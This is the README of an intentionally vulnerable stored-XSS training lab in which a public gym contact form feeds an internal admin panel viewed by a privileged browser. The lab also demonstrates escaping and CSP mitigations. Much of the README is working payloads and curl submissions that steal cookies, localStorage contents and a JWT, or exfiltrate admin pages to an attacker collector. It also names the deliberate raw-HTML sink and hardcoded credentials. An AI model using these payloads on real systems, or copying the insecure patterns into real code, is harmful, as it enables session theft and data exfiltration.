# Dalfox XSS Lab

Stored XSS / second-order XSS laboratory for isolated demonstrations with Docker Compose, Nginx, Node.js, PostgreSQL, Playwright, and a manual Python collector.

This repository starts in intentionally vulnerable mode. Use it only in a controlled environment that you own.

## What This Lab Demonstrates

1. A public form on `cross.fit` stores attacker-controlled content.
2. An internal admin panel on `backend.cross.fit` later renders that content.
3. A privileged browser session can become the bridge to an internal system even when the attacker cannot reach that backend directly.
4. A JWT stored client-side in the privileged browser can be stolen and then replayed explicitly against protected backend routes.
5. Mitigations such as contextual output escaping and CSP reduce or block exploitation.

## Architecture

Services:

- `public-proxy`: only published entrypoint on host port `80`
- `public-app`: public gym landing page and contact form
- `internal-proxy`: Docker-only reverse proxy for `backend.cross.fit`
- `internal-app`: internal admin panel
- `worker`: Playwright browser logged in as admin
- `db`: PostgreSQL 16

Trust boundary:

- `cross.fit` is reachable from the attacker machine.
- `backend.cross.fit` is only resolvable inside Docker through the `internal-proxy` alias.
- The attacker should not be able to browse `backend.cross.fit` directly through the exposed port.

## Repository Layout

```text
.
├── docker-compose.yml
├── db/
├── nginx/
├── public-app/
├── internal-app/
├── worker/
├── tools/
└── docs/project_notes/
```

## Requirements

- Docker Engine + Docker Compose plugin
- `curl`
- Python 3
- Optional: Dalfox on the attacker machine

## Local Domains

Variables used in this guide:

- `container_machine_ip`: IP of the machine that is running the lab containers
- `attacker_machine_ip`: IP of the attacker machine
- `docker_host_gateway_ip`: optional host gateway visible from containers when attacker and lab run on the same host

### Attacker machine

Add only this mapping:

```text
container_machine_ip   cross.fit
```

Do not add:

```text
container_machine_ip   backend.cross.fit
```

Reason:

- the attacker should resolve `cross.fit`
- the attacker should not resolve `backend.cross.fit` directly

### Same-host note

If you are validating the lab from a single machine instead of two separate machines, some XSS callbacks may need to target the Docker host gateway instead of a second host. In that case, use a value such as `docker_host_gateway_ip` in the payloads.

## Configuration

Copy `.env.example` to `.env` if you want persistent local overrides:

```bash
cp .env.example .env
```

Supported variables:

- `LAB_MODE=vulnerable|mitigated`
- `JWT_SECRET=` optional explicit override
- `AUTH_TOKEN_TTL=` optional explicit override
- `ENABLE_CSP=` optional explicit override
- `RENDER_UNSAFE_HTML=` optional explicit override
- `POLL_INTERVAL_SECONDS=20`

Behavior:

- `vulnerable`:
  - raw HTML rendering enabled
  - internal auth stays as explicit JWT
  - CSP disabled
- `mitigated`:
  - escaped output enabled
  - CSP enabled

## Start The Lab

```bash
docker compose up --build -d
```

Check status:

```bash
docker compose ps
```

Expected:

- `public-proxy` published on `0.0.0.0:80`
- `public-app`, `internal-app`, `internal-proxy`, `db`, and `worker` running
- no published host ports for `3000`, `3001`, or `5432`

## Reset The Lab Database

After a full lab run, you can restore the database to a clean baseline with:

```bash
./tools/reset-db.sh
```

This reset does the following:

- removes all rows from `contact_messages`
- removes all rows from `internal_users`
- recreates the internal user `admin/admin123`
- inserts a small set of benign example contact messages

SQL source:

```text
db/reset_lab.sql
```

Expected result after reset:

- the worker can log in again as `admin`
- there are no old XSS payloads left in the database
- the message list starts from a known baseline

## Infrastructure Validation

### Public entrypoint

```bash
curl -i http://cross.fit/
```

Expected: landing page for `CrossFit Atlas`.

### Backend isolation

```bash
curl -i -H "Host: backend.cross.fit" http://container_machine_ip/
```

Expected: connection closed, empty reply, or a non-success response. The internal backend must not be reachable through the published port.

### Worker access to internal backend

```bash
docker compose exec -T worker wget -S -O- http://backend.cross.fit/login
```

Expected: `200 OK`.

## Public App Flow

Open:

```text
http://cross.fit
```

Submit the contact form with:

- `full_name`
- `email`
- optional `phone`
- `message`

The `message` field is intentionally stored without sanitization in vulnerable mode.

## Optional Collector Script

Later in the lab, when you no longer want to capture requests by hand, you can use the bundled collector:

```bash
python3 tools/collector.py
```

It listens on:

```text
0.0.0.0:9000
```

## Step-by-Step Presentation Flow

The full walkthrough now lives in [docs/step-by-step-lab.md](/home/e090222/Escritorio/github-hipoloco/xsslab/docs/step-by-step-lab.md:1).

Use that guide for the live sequence of:

- probe request execution
- cookie probe and `localStorage` discovery
- JWT confirmation
- front page HTML exfiltration
- transition to the scripted collector

## Payloads

Replace:

- `attacker_machine_ip` with the IP of the attacker machine
- `docker_host_gateway_ip` only when doing same-host validation

### Probe request to a manual Python HTTP server

Use this first if you only want to prove code execution against the internal backend:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/ping'">
```

Same-host validation shortcut:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/ping'">
```

Expected on the attacker machine with `python3 -m http.server 8000`:

```text
"GET /ping HTTP/1.1" 404 -
```

The `404` is fine. What matters is that the request reached the attacker-controlled server.

### Cookie theft probe

Use this short payload first if you want to check whether the privileged browser exposes a useful session cookie:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
```

Same-host validation shortcut:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
```

Expected in the current JWT-based lab:

- `collector.py` receives `GET /collect`
- `c=` may be empty or may not contain a reusable session credential

### `localStorage` enumeration from the privileged browser

Use this next if the cookie probe was not enough and you want to discover how the privileged browser stores reusable state.

The full inline version is:

```html
<script>
for (let i = 0; i < localStorage.length; i += 1) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key) || '';
  new Image().src =
    'http://attacker_machine_ip:9000/collect?key=' +
    encodeURIComponent(key) +
    '&value=' +
    encodeURIComponent(value);
}
</script>
```

Same-host validation shortcut:

```html
<script>
for (let i = 0; i < localStorage.length; i += 1) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key) || '';
  new Image().src =
    'http://docker_host_gateway_ip:9000/collect?key=' +
    encodeURIComponent(key) +
    '&value=' +
    encodeURIComponent(value);
}
</script>
```

That inline payload is too large for the public `message` field once it is limited to `250` characters, so in practice you should load it from an external file.

### `localStorage` enumeration via external JavaScript

Serve:

```text
tools/payload-localstorage-scan.js
```

and submit:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js"></script>
```

Same-host validation shortcut:

```html
<script src="http://docker_host_gateway_ip:8000/tools/payload-localstorage-scan.js"></script>
```

Expected in vulnerable mode:

- `collector.py` receives one or more `GET /collect`
- at least one leaked value has the shape of a JWT

### JWT theft from the privileged browser

Use this after you already identified the `localStorage` key that contains the JWT:

```html
<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
```

Same-host validation shortcut:

```html
<img src=x onerror="new Image().src='http://docker_host_gateway_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
```

Expected in vulnerable mode:

- `collector.py` receives `GET /collect`
- the query contains `jwt=eyJ...`

### Backend front page exfiltration in Base64

Use this after stealing the JWT, when you want to retrieve the unauthenticated front page of `backend.cross.fit` and decode it locally.

This is the inline version shown for reference:

```html
<script>
fetch('/')
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Same-host validation shortcut:

```html
<script>
fetch('/')
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://docker_host_gateway_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Like the inline `localStorage` enumeration payload, this one does not fit in the current `250` character `message` field.

In practice you should load it through the external helper below.

Expected:

- the attacker-side listener receives `POST /internal-html`
- the raw body is Base64
- decoding it yields the login page HTML of `backend.cross.fit`

### Backend front page exfiltration via external JavaScript

Use this one through the public form:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-frontpage.js"></script>
```

Same-host validation shortcut:

```html
<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage.js"></script>
```

### Front page request with explicit JWT

This repeats the request to `/`, but now sending the stolen JWT.

Inline reference version:

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

This inline version does not fit in the current `250` character `message` field.

### Front page request with explicit JWT via external JavaScript

Use this one through the public form:

```html
<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
```

Same-host validation shortcut:

```html
<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
```

Expected:

- the returned HTML corresponds to the dashboard
- the dashboard includes a link to `/admin/messages`

### Protected dashboard exfiltration with explicit JWT

Once you have the stolen JWT and confirmed that it is stored as `gym_internal_token`, you can replay it explicitly to request `/admin`:

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/admin', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Expected:

- the returned HTML corresponds to `/admin`
- the dashboard includes a link to `/admin/messages`

### Protected message list exfiltration with explicit JWT

```html
<script>
const token = localStorage.getItem('gym_internal_token');
fetch('/admin/messages', {
  headers: {
    Authorization: 'Bearer ' + token
  }
})
  .then(r => r.text())
  .then(html => {
    const b64 = btoa(unescape(encodeURIComponent(html)));
    fetch('http://attacker_machine_ip:9000/internal-html', {
      method: 'POST',
      mode: 'no-cors',
      headers: { 'Content-Type': 'text/plain' },
      body: b64
    });
  });
</script>
```

Expected in vulnerable mode:

- `collector.py` receives `POST /internal-html`
- the body decodes to the HTML of `/admin/messages`

### Visual XSS

```html
<script>alert('XSS ejecutado en backend.cross.fit')</script>
```

Expected:

- the script executes in the privileged Playwright browser
- the worker logs the dialog event

## Submit Payloads With curl

### Legitimate message

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Juan Perez" \
  -d "email=juan@example.com" \
  -d "phone=099123456" \
  -d "message=Quiero informacion sobre planes mensuales"
```

### `localStorage` enumeration payload

This is the inline version shown for reference, but it does not fit in the current `250` character `message` field.

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Storage" \
  -d "email=xss-storage@example.com" \
  -d "phone=099000000" \
  --data-urlencode "message=<script>for (let i = 0; i < localStorage.length; i += 1) { const key = localStorage.key(i); const value = localStorage.getItem(key) || ''; new Image().src='http://attacker_machine_ip:9000/collect?key='+encodeURIComponent(key)+'&value='+encodeURIComponent(value); }</script>"
```

### `localStorage` external loader payload

Use this one through the public form:

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Storage JS" \
  -d "email=xss-storage-js@example.com" \
  -d "phone=099000000" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-localstorage-scan.js\"></script>"
```

### JWT theft payload

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS" \
  -d "email=xss@example.com" \
  -d "phone=099000000" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')\">"
```

### Probe request to Python HTTP server

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Probe" \
  -d "email=xss-probe@example.com" \
  -d "phone=099000009" \
  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:8000/ping'\">"
```

### Backend front page exfiltration in Base64

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Frontpage" \
  -d "email=xss-frontpage@example.com" \
  -d "phone=099000011" \
  --data-urlencode "message=<script>fetch('/').then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://attacker_machine_ip:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
```

### Backend front page exfiltration via external JavaScript

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Frontpage JS" \
  -d "email=xss-frontpage-js@example.com" \
  -d "phone=099000013" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage.js\"></script>"
```

### Front page request with explicit JWT via external JavaScript

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS Root JWT JS" \
  -d "email=xss-root-jwt-js@example.com" \
  -d "phone=099000014" \
  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js\"></script>"
```

### `/admin/messages` exfiltration payload with explicit JWT

```bash
curl -i -X POST http://cross.fit/contact \
  -d "full_name=Alumno XSS 2" \
  -d "email=xss2@example.com" \
  -d "phone=099000001" \
  --data-urlencode "message=<script>const token=localStorage.getItem('gym_internal_token');fetch('/admin/messages',{headers:{Authorization:'Bearer '+token}}).then(r=>r.text()).then(html=>{const b64=btoa(unescape(encodeURIComponent(html)));fetch('http://attacker_machine_ip:9000/internal-html',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:b64});});</script>"
```

## Worker Behavior

The worker intentionally behaves like a real privileged user:

1. Requests a JWT from `http://backend.cross.fit/api/login`
2. Stores that JWT in the privileged browser `localStorage`
3. Visits `/admin/messages/next?token=...`
4. Waits for the page to render
5. Marks the message as processed

Logs:

```bash
docker compose logs -f worker
```

## Dalfox

Primary scenario:

```bash
dalfox url "http://cross.fit/contact" \
  -X POST \
  -d "full_name=Test&email=test@example.com&phone=123&message=INJECT_HERE"
```

Notes:

- this repository does not include the optional `/preview` helper route
- the core exercise focuses on the stored XSS chain, not a reflected helper

## Mitigation Mode

Switch the lab to mitigated mode:

```bash
LAB_MODE=mitigated docker compose up -d --build internal-app worker
```

Mitigated behavior:

- message detail renders escaped content instead of raw HTML
- CSP blocks inline scripts and inline event handlers
- the internal auth model remains explicit JWT, but the XSS sink is no longer executable

## Validate The Mitigation

1. Start a fresh `collector.py`.
2. Switch to mitigated mode.
3. Submit the same payloads again.
4. Watch the worker logs.
5. Confirm the collector receives nothing.

Expected:

- the worker still processes the message
- the payload appears as text in the internal detail view
- no JWT theft reaches the collector
- no `/internal-html` POST reaches the collector

## Shutdown

```bash
docker compose down -v
```

## Notes About Intentional Insecurity

This repository intentionally includes:

- stored attacker-controlled HTML in the public form flow
- a vulnerable raw HTML sink in the admin detail page when `LAB_MODE=vulnerable`
- static lab credentials (`admin/admin123`)
- a JWT stored in `localStorage` inside the privileged browser

These choices exist only for the lab scenario.

## References

- OWASP Cross-Site Scripting:
  `https://owasp.org/www-community/attacks/xss/`
- OWASP XSS Prevention Cheat Sheet:
  `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`
- MDN Web Storage API:
  `https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API`
- Docker Compose Networking:
  `https://docs.docker.com/compose/how-tos/networking/`
- Nginx access controls:
  `https://nginx.org/en/docs/http/ngx_http_access_module.html`
